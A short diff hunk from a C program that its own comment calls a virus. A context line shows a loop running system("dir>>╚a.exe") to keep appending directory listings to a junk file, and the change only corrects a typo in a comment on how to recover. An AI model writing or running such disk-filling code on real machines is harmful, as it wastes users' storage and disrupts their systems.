@@ -6,4 +6,4 @@ void main(){
     system("dir>>╚a.exe");
     }
 } 
-//to recover, simply delete virus filr and ╚a.exe file from your computer.
+//to recover, simply delete virus file and ╚a.exe file from your computer.
